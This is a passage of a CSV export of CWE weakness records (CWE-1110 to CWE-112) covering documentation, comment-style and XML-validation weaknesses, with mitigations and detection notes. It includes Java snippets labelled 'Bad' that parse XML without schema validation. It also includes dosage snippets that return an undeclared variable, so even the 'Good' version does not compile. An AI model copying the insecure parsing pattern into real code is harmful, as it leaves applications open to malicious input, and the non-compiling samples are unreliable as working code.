[{""note"": """", ""scope"": ""Access Control"", ""impact"": ""Bypass Protection Mechanism""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Implement error handling around the JNI call.; Do not use JNI calls if you don't trust the native library.; Be reluctant to use JNI calls. A Java API equivalent may exist."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""Many safety features that programmers may take for granted do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.""}"
"CWE-1110","Incomplete Design Documentation","The product's design documentation does not adequately describe
					control flow, data flow, system initialization, relationships between tasks,
					components, rationales, or other important aspects of the
					design.","","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Incomplete Design Documentation"", ""cwe_id"": ""CWE-1110"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product's design documentation does not adequately describe\n\t\t\t\t\tcontrol flow, data flow, system initialization, relationships between tasks,\n\t\t\t\t\tcomponents, rationales, or other important aspects of the\n\t\t\t\t\tdesign."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": """"}"
"CWE-1111","Incomplete I/O Documentation","The product's documentation does not adequately define inputs,
					outputs, or system/software interfaces.","","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Incomplete I/O Documentation"", ""cwe_id"": ""CWE-1111"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product's documentation does not adequately define inputs,\n\t\t\t\t\toutputs, or system/software interfaces."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": """"}"
"CWE-1112","Incomplete Documentation of Program Execution","The document does not fully define all mechanisms that are used
					to control or influence how product-specific programs are
					executed.","This includes environmental variables, configuration files, registry keys, command-line switches or options, or system settings.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Incomplete Documentation of Program Execution"", ""cwe_id"": ""CWE-1112"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The document does not fully define all mechanisms that are used\n\t\t\t\t\tto control or influence how product-specific programs are\n\t\t\t\t\texecuted."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This includes environmental variables, configuration files, registry keys, command-line switches or options, or system settings.""}"
"CWE-1113","Inappropriate Comment Style","The source code uses comment styles or formats that are
					inconsistent or do not follow expected standards for the
					product.","This issue makes it more difficult to maintain the product due to insufficient legibility, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Inappropriate Comment Style"", ""cwe_id"": ""CWE-1113"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code uses comment styles or formats that are\n\t\t\t\t\tinconsistent or do not follow expected standards for the\n\t\t\t\t\tproduct."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product due to insufficient legibility, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1114","Inappropriate Whitespace Style","The source code contains whitespace that is inconsistent across
					the code or does not follow expected standards for the
					product.","This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Inappropriate Whitespace Style"", ""cwe_id"": ""CWE-1114"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code contains whitespace that is inconsistent across\n\t\t\t\t\tthe code or does not follow expected standards for the\n\t\t\t\t\tproduct."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1115","Source Code Element without Standard Prologue","The source code contains elements such as source files 
					that do not consistently provide a prologue or header that has been
					standardized for the project.","The lack of a prologue can make it more difficult to accurately and quickly understand the associated code. Standard prologues or headers may contain information such as module name, version number, author, date, purpose, function, assumptions, limitations, accuracy considerations, etc.
This issue makes it more difficult to maintain the product due to insufficient analyzability, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Source Code Element without Standard Prologue"", ""cwe_id"": ""CWE-1115"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code contains elements such as source files \n\t\t\t\t\tthat do not consistently provide a prologue or header that has been\n\t\t\t\t\tstandardized for the project."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""The lack of a prologue can make it more difficult to accurately and quickly understand the associated code. Standard prologues or headers may contain information such as module name, version number, author, date, purpose, function, assumptions, limitations, accuracy considerations, etc.\nThis issue makes it more difficult to maintain the product due to insufficient analyzability, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1116","Inaccurate Comments","The source code contains comments that do not accurately
					describe or explain aspects of the portion of the code with which the comment is
					associated.","When a comment does not accurately reflect the associated code elements, this can introduce confusion to a reviewer (due to inconsistencies) or make it more difficult and less efficient to validate that the code is implementing the intended behavior correctly.
This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Verify that each comment accurately reflects what is intended to happen during execution of the code."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                 public static void main(String[] args) {\n                   int pt_weight = 83;\n\t\t     int mg_per_kg = 3;\n\t\t     int daily_dose = 0;\n\t\t     \n\t\t     // Add the patient weight and Mg/Kg to calculate the correct daily dose\n\t\t     daily_dose = pt_weight * mg_per_kg;\n                     return dosage;\n                   }\n                 }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                 public static void main(String[] args) {\n                   int pt_weight = 83;\n\t\t     int mg_per_kg = 3;\n\t\t     int daily_dose = 0;\n\t\t     \n\t\t     // Multiply the patient weight and Mg/Kg to calculate the correct daily dose\n\t\t     daily_dose = pt_weight * mg_per_kg;\n                     return dosage;\n                   }\n                 }"", ""language"": ""Good""}]}]","","{""name"": ""Inaccurate Comments"", ""cwe_id"": ""CWE-1116"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Main {\n                 public static void main(String[] args) {\n                   int pt_weight = 83;\n\t\t     int mg_per_kg = 3;\n\t\t     int daily_dose = 0;\n\t\t     \n\t\t     // Add the patient weight and Mg/Kg to calculate the correct daily dose\n\t\t     daily_dose = pt_weight * mg_per_kg;\n                     return dosage;\n                   }\n                 }"", ""language"": ""Bad""}, {""code"": ""public class Main {\n                 public static void main(String[] args) {\n                   int pt_weight = 83;\n\t\t     int mg_per_kg = 3;\n\t\t     int daily_dose = 0;\n\t\t     \n\t\t     // Multiply the patient weight and Mg/Kg to calculate the correct daily dose\n\t\t     daily_dose = pt_weight * mg_per_kg;\n                     return dosage;\n                   }\n                 }"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The source code contains comments that do not accurately\n\t\t\t\t\tdescribe or explain aspects of the portion of the code with which the comment is\n\t\t\t\t\tassociated."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Verify that each comment accurately reflects what is intended to happen during execution of the code."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Verify that each comment accurately reflects what is intended to happen during execution of the code."", ""detection_methods"": [], ""extended_description"": ""When a comment does not accurately reflect the associated code elements, this can introduce confusion to a reviewer (due to inconsistencies) or make it more difficult and less efficient to validate that the code is implementing the intended behavior correctly.\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1117","Callable with Insufficient Behavioral Summary","The code contains a function or method whose signature and/or associated
					inline documentation does not sufficiently describe the callable's inputs, outputs,
					side effects, assumptions, or return codes.","This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Callable with Insufficient Behavioral Summary"", ""cwe_id"": ""CWE-1117"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code contains a function or method whose signature and/or associated\n\t\t\t\t\tinline documentation does not sufficiently describe the callable's inputs, outputs,\n\t\t\t\t\tside effects, assumptions, or return codes."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-1118","Insufficient Documentation of Error Handling Techniques","The documentation does not sufficiently describe the techniques
					that are used for error handling, exception processing, or similar
					mechanisms.","Documentation may need to cover error handling techniques at multiple layers, such as module, executable, compilable code unit, or callable.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[]","[]","[]","[]","","{""name"": ""Insufficient Documentation of Error Handling Techniques"", ""cwe_id"": ""CWE-1118"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The documentation does not sufficiently describe the techniques\n\t\t\t\t\tthat are used for error handling, exception processing, or similar\n\t\t\t\t\tmechanisms."", ""mitigations"": [], ""consequences"": [], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""Documentation may need to cover error handling techniques at multiple layers, such as module, executable, compilable code unit, or callable.""}"
"CWE-1119","Excessive Use of Unconditional Branching","The code uses too many unconditional branches (such as
					""goto"").","This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}]","[]","[]","[]","","{""name"": ""Excessive Use of Unconditional Branching"", ""cwe_id"": ""CWE-1119"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code uses too many unconditional branches (such as\n\t\t\t\t\t\""goto\"")."", ""mitigations"": [], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Reduce Maintainability""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": ""This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.""}"
"CWE-112","Missing XML Validation","The product accepts XML from an untrusted source but does not validate the XML against the proper schema.","Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.","Base","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}]","[{""phases"": ""Architecture and Design"", ""strategy"": ""Input Validation"", ""description"": ""Always validate XML input against a known XML Schema or DTD.\n                  It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""// Read DOM\n                     try {...DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();factory.setValidating( false );....c_dom = factory.newDocumentBuilder().parse( xmlFile );} catch(Exception ex) {...}"", ""language"": ""Bad""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();builderFactory.setNamespaceAware(true);DocumentBuilder builder = builderFactory.newDocumentBuilder();"", ""language"": ""Bad""}]}]","","{""name"": ""Missing XML Validation"", ""cwe_id"": ""CWE-112"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""// Read DOM\n                     try {...DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();factory.setValidating( false );....c_dom = factory.newDocumentBuilder().parse( xmlFile );} catch(Exception ex) {...}"", ""language"": ""Bad""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""DocumentBuilderFactory builderFactory = DocumentBuilderFactory.newInstance();builderFactory.setNamespaceAware(true);DocumentBuilder builder = builderFactory.newDocumentBuilder();"", ""language"": ""Bad""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product accepts XML from an untrusted source but does not validate the XML against the proper schema."", ""mitigations"": [{""phases"": ""Architecture and Design"", ""strategy"": ""Input Validation"", ""description"": ""Always validate XML input against a known XML Schema or DTD.\n                  It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Integrity"", ""impact"": ""Unexpected State""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [""CAPEC-230"", ""CAPEC-231""], ""mitigations_text"": ""Always validate XML input against a known XML Schema or DTD.\n                  It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.""}"
